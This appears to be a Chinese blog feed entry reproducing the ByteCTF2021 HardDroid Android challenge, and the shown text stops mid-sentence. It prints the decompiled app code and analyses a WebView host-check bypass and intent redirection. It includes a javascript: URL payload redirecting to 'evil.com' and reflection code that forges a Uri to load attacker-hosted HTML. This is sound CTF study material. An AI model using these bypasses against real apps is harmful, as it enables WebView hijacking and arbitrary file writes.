4 --count 64 $sp</span><br></pre></td></tr></table></figure><p>想看 libc 基址&#x2F;模块列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">image list</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-ByteDroid2复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-ByteDroid2复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 ByteDroid2复现&quot;&gt;&lt;/a&gt;ByteCTF2021 By</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 HardDroid复现</title>
    <link href="http://matriy330.github.io/668cb1db/"/>
    <id>http://matriy330.github.io/668cb1db/</id>
    <published>2026-01-25T14:55:29.000Z</published>
    <updated>2026-01-25T14:55:57.018Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-HardDroid复现"><a href="#ByteCTF2021-HardDroid复现" class="headerlink" title="ByteCTF2021 HardDroid复现"></a>ByteCTF2021 HardDroid复现</h1><p>依旧参考：<a href="https://blog.lleavesg.top/article/ByteCTF-2021-HardDroid#7c33bb5009474edda052a2c5bcc8b54f">ByteCTF2021 HardDroid复现 | LLeaves Blog</a></p><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>注意到这里的TestActivity与之前不同，android:launchMode&#x3D;”standard，是 Activity 的启动模式，决定了系统在启动这个 Activity 时，如何创建&#x2F;复用实例。</p><p><code>standard</code> &#x3D; 每次 <code>startActivity()</code>，都会新建一个 Activity 实例 (默认值)</p><table><thead><tr><th>launchMode</th><th>行为</th><th></th></tr></thead><tbody><tr><td><strong>standard</strong></td><td>每次启动都 new 一个</td><td>默认，最容易被反复触发</td></tr><tr><td>singleTop</td><td>栈顶复用</td><td>防止重复打开页面</td></tr><tr><td>singleTask</td><td>全局唯一一个</td><td>常用于登录页</td></tr><tr><td>singleInstance</td><td>独占一个任务栈</td><td>很少见，系统级</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260123225015365.png" alt="image-20260123225015365"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.harddroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Harddroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:usesCleartextTraffic</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.harddroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.harddroid.TestActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:launchMode</span>=<span class="string">&quot;standard&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.harddroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><p>跟之前一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.harddroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TestActivity"><a href="#TestActivity" class="headerlink" title="TestActivity"></a>TestActivity</h3><p>TestActivity 是非导出的，其中有一个native方法native_write 用于在native层写入文件，还有JavaScript接口方法write_file用于向设备中写入文件。setJavaScriptEnabled也被设置为true状态。</p><p>handle方法获取了Intent的data并且进行data.getScheme().equals(“http”) &amp;&amp; data.getAuthority().equals(“app.toutiao.com”) 校验，如果通过则加载libUtils.so 并且添加js接口允许js访问write_file 方法 ，否则移除js接口。</p><p>onNewIntent 则也要对intent进行handle处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.harddroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.webkit.JavascriptInterface;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    String soPath;</span><br><span class="line">    WebView webView;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">native_write</span><span class="params">(String str, <span class="type">byte</span>[] bArr)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> intent.getData();</span><br><span class="line">        <span class="keyword">if</span> (data.getScheme().equals(<span class="string">&quot;http&quot;</span>) &amp;&amp; data.getAuthority().equals(<span class="string">&quot;app.toutiao.com&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.soPath).exists()) &#123;</span><br><span class="line">                System.load(<span class="built_in">this</span>.soPath);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.loadLibrary(<span class="string">&quot;Utils&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.webView.addJavascriptInterface(<span class="built_in">this</span>, <span class="string">&quot;jsi&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.webView.removeJavascriptInterface(<span class="string">&quot;jsi&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.webView.loadUrl(data.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.soPath = getApplicationContext().getFilesDir() + <span class="string">&quot;/libUtils.so&quot;</span>;</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">        <span class="built_in">this</span>.webView = webView;</span><br><span class="line">        setContentView(webView);</span><br><span class="line">        <span class="built_in">this</span>.webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        handle(getIntent());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNewIntent</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onNewIntent(intent);</span><br><span class="line">        handle(intent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write_file</span><span class="params">(String file, String content)</span> &#123;</span><br><span class="line">        native_write(file, Base64.decode(content, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><blockquote><p>MainActivity和EasyDroid中的MainActivity 流程一样，先是获取intent的数据，然后经过校验后使用webView.loadUrl(data.toString())进行加载，而且设置了setJavaScriptEnabled(true) 这意味着启用了JavaScript 。除此之外设置了setWebViewClient ，并且通过shouldOverrideUrlLoading 拦截请求，在内部校验intent 并且可以进行跳转。因此这里存在攻击点，即可以绕过getAuthority校验加载恶意html，在html内部使用JavaScript 构造重定向请求，然后跳转到指定的非导出Activity</p><p>但是也有不同的地方，就是校验data的地方data.getHost().endsWith(“.toutiao.com”) &amp;&amp; data.getScheme().equals(“http”) 在这个APP中，是对data的host字段尾部进行校验，使其必须为.toutiao.com ，同时校验协议http，虽然在ByteDroid1的复现文章里提到过如何绕过这种检测，但是绕过方法在Android11(API 30)中已经修复(这个补丁在 Oreo - 8.1.0_r33 才加入到原生源码中。所以安全补丁日期早于2018-04-01的系统都受影响)，除此之外由于校验http ，所以通过javascript协议绕过的方法<code>JavaScript://www.toutiao.com//%0d%0awindow.location.href=&#39;http://evil.com&#39;</code>也不可行，因此需要通过其他方法绕过。</p><p>这里在后面会介绍一下javascript协议绕过方法</p></blockquote><p>来自LLeaves</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.harddroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebViewClient;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            data = Uri.parse(<span class="string">&quot;http://app.toutiao.com/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (data.getHost().endsWith(<span class="string">&quot;.toutiao.com&quot;</span>) &amp;&amp; data.getScheme().equals(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(getApplicationContext());</span><br><span class="line">            webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123; <span class="comment">// from class: com.bytectf.harddroid.MainActivity.1</span></span><br><span class="line">                <span class="meta">@Override</span> <span class="comment">// android.webkit.WebViewClient</span></span><br><span class="line">                <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">                    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(url);</span><br><span class="line">                    <span class="keyword">if</span> (uri.getScheme().equals(<span class="string">&quot;intent&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            MainActivity.<span class="built_in">this</span>.startActivity(Intent.parseUri(url, <span class="number">1</span>));</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (URISyntaxException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, url);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            setContentView(webView);</span><br><span class="line">            webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">            webView.loadUrl(data.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>因为MainActivity存在Intent跳转点，并且没有什么其他可以利用的地方，所以需要先跳转到TestActivity进行攻击，但是需要先对校验进行绕过，否则无法正常加载恶意html，无法进行跳转。</p><p>这里需要构造HierarchicalUri 来绕过对host的校验。审android.net.Uri源码，发现除了StringUri，还有一个内部类也 HierarchicalUri 也继承了 AbstractHierarchicalUri，而AbstractHierarchicalUri又是继承自Uri，所以很容易想到，通过反射调用HierarchicalUri这个私有构造函数，传入构造好的 authority 和 path, 创建一个任意可控的Uri实例。具体可以看<a href="https://blog.csdn.net/tabactivity/article/details/129197015">绕过Android域名白名单校验的方法_url白名单endswith绕过-CSDN博客</a></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260125142502985.png" alt="image-20260125142502985"></p><p>我抄下来了，放在结尾，hackone上的已经不公开了</p></blockquote><p>先看完末尾的文章也就是csdn上的更好理解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">toutiaoUri</span> <span class="operator">=</span> <span class="string">&quot;app.toutiao.com&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">attackerUri</span> <span class="operator">=</span> <span class="string">&quot;@xxx.xxx.xxx.xxx/harddroid.html&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">hierarchicalUriConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(toutiaoUri, toutiaoUri);</span><br><span class="line"><span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(attackerUri, attackerUri);</span><br><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;http&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">Log.d(TAG, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">Log.d(TAG, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">Log.d(TAG, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">Log.d(TAG, <span class="string">&quot;Authority: &quot;</span> + uri.getAuthority());</span><br><span class="line">Log.d(TAG, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Scheme: http</span></span><br><span class="line"><span class="comment">// UserInfo: null</span></span><br><span class="line"><span class="comment">// Host: app.toutiao.com</span></span><br><span class="line"><span class="comment">// Authority: app.toutiao.com</span></span><br><span class="line"><span class="comment">// toString(): http://app.toutiao.com@xxx.xxx.xxx.xxxharddroid.html</span></span><br></pre></td></tr></table></figure><blockquote><p>上述代码在低版本中没问题，但到了安卓11就会报错，原因是<strong>从 Android 9（API 级别 28）开始，Android 平台对应用能使用的非 SDK 接口实施了限制</strong>。只要应用引用非 SDK 接口或尝试使用反射或 JNI 来获取其句柄，这些限制就适用。这些限制旨在帮助提升用户体验和开发者体验，为用户降低应用发生崩溃的风险，同时为开发者降低紧急发布的风险。如需详细了解有关此限制的决定，请参阅<a href="https://android-developers.googleblog.com/2018/02/improving-stability-by-reducing-usage.html">通过减少非 SDK 接口的使用来提高稳定性</a>。可以通过Lsposed的<a href="https://github.com/LSPosed/AndroidHiddenApiBypass">AndroidHiddenApiBypass</a>绕过</p><p>当执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(&quot;android.net.Uri$HierarchicalUri&quot;);</span><br><span class="line">constructor.setAccessible(true);</span><br></pre></td></tr></table></figure><p>系统会：</p><ol><li>检查这个类&#x2F;方法是否属于 <strong>非 SDK 接口</strong></li><li>如果属于：<ul><li>在 Android 9+：<ul><li>直接抛异常（<code>IllegalAccessException</code> &#x2F; <code>NoSuchMethodError</code>）</li><li>或在 Android 11 更严格：<strong>直接崩</strong></li></ul></li></ul></li></ol><p><strong>系统不允许摸这些类了</strong></p><p><strong>非 